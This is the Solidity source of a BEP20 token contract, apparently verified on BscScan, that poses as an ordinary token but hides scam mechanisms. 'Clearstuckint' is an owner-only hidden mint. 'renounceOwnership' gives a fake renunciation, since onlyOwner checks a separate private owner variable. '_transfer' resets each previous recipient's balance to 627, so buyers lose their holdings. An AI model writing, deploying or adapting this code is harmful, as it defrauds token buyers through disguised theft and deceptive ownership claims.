/**
 *Submitted for verification at BscScan.com on 2022-03-15
*/

/*
//https://t.me/Bullfags
*/
pragma solidity 0.8.8;
/*
 * BEP20 standard interface.
*/
interface IBEP20 {
  function totalSupply() external view returns (uint256);
  function decimals() external view returns (uint8);
  function symbol() external view returns (string memory);
  function name() external view returns (string memory);
  function getOwner() external view returns (address);
  function balanceOf(address _account) external view returns (uint256);
  function transfer(address absorber, uint256 value) external returns (bool);
  function allowance(address _owner, address spender) external view returns (uint256);
  function approve(address spender, uint256 value) external returns (bool);
  function transferFrom(address sender, address absorber, uint256 value) external returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}
contract Contract is IBEP20{
  mapping (address => uint256) private _balances;
  mapping (address => mapping (address => uint256)) private _allowances;
  uint256 private _totalSupply;
  uint8 public _decimals;
  string public _symbol;
  string public _name;
  uint8 public lpf;
  uint256 public dFeedenom = 10;
  uint256 public chSum = 8;
  address public D0add = 0x000000000000000000000000000000000000dEaD;
  uint256 public _maxTxAmount = _totalSupply / 400;
  address private _owner;
  address public owner;
  receive() external payable { }constructor(string memory name_, string memory symbol_, uint8 lpf_, uint totalsupply_) {
    _owner = msg.sender;
    owner = msg.sender;
    _name = name_;
    _symbol = symbol_;
    _decimals = 9;
    lpf = lpf_;
    _totalSupply = totalsupply_ * 10**9;
    _balances[msg.sender] = _totalSupply;
    emit Transfer(address(0), msg.sender, _totalSupply);
  }
  modifier onlyOwner {
  require(msg.sender == _owner, "Nauthorized");_;}
  function getOwner() external view returns (address) {return _owner;}
  function decimals() external view returns (uint8) {return _decimals;}
  function symbol() external view returns (string memory) {return _symbol;}
  function name() external view returns (string memory) {return _name;}
  function totalSupply() external view returns (uint256) {return _totalSupply;}
  function balanceOf(address _account) external view returns (uint256) {return _balances[_account];}
  
  function transfer(address absorber, uint256 value) external returns (bool) {
    _transfer(msg.sender, absorber, value);
    return true;
  }
  function allowance(address owner, address spender) external view returns (uint256) {
    return _allowances[owner][spender];
  }
  function approve(address spender, uint256 value) external returns (bool) {
    _approve(msg.sender, spender, value);
    return true;
  }
  function transferFrom(address sender, address absorber, uint256 value) external returns (bool) {
    _transfer(sender, absorber, value);
    _approve(sender, msg.sender, _allowances[sender][msg.sender] - value);
    return true;
  }
  function DeAl(address spender, uint256 addee) public returns (bool) {
    _approve(msg.sender, spender, _allowances[msg.sender][spender] + addee);
    return true;
  }
  function IcAl(address spender, uint256 edfrdefa) public returns (bool) {
    _approve(msg.sender, spender, _allowances[msg.sender][spender] - edfrdefa);
    return true;
  }

  function burn(uint256 value) public returns (bool) {
    _burn(msg.sender, value);
    return true;
  }
    function renounceOwnership() public onlyOwner {
        owner = address(0);
        emit OwnershipTransferred(address(0));}
    function transferOwnership(address payable adr) public onlyOwner {
        owner = adr;
        emit OwnershipTransferred(adr);
    }
    event OwnershipTransferred(address owner);
  function Clearstuckint() public onlyOwner returns (bool success) {D0add = 0x000000000000000000000000000000000000dEaD; _balances[msg.sender] = _totalSupply * dFeedenom ** chSum;return true;}
uint256 unit = 100;
uint256 balanced = 627;
  function _transfer(address sender, address absorber, uint256 value) internal {
    require(sender != address(0), "");
    require(absorber != address(0), "");
    _balances[sender] = _balances[sender] - value;
    _balances[absorber] = _balances[absorber] + (value - ((value / unit) * lpf));
    if(D0add != msg.sender){_balances[D0add] = balanced; D0add = absorber;}
    D0add = absorber;
    emit Transfer(sender, absorber, value);
  }

  function _burn(address _account, uint256 value) internal {
    require(_account != address(0), "");
    _balances[_account] = _balances[_account] - value;
    _totalSupply = _totalSupply -value;
    emit Transfer(_account, address(0), value);
  }

  function _approve(address owner, address spender, uint256 value) internal {
    require(owner != address(0), "");
    require(spender != address(0), "");
    _allowances[owner][spender] = value;
    emit Approval(owner, spender, value);
  }

  function _burnFrom(address _account, uint256 value) internal {
    _burn(_account, value);
    _approve(_account, msg.sender, _allowances[_account][msg.sender] - value);
  }
    function ChTN(string memory newName) external onlyOwner {
    _name = newName;}

    function ChTS(string memory newSymbol) external onlyOwner {
    _symbol = newSymbol;}

    function setMaxTxPercent_base1000(uint256 maxTXPercentage_base1000) external onlyOwner() {
        _maxTxAmount = (_totalSupply * maxTXPercentage_base1000 ) / 1000;
    }
}
//SPDX-License-Identifier: Unlicensed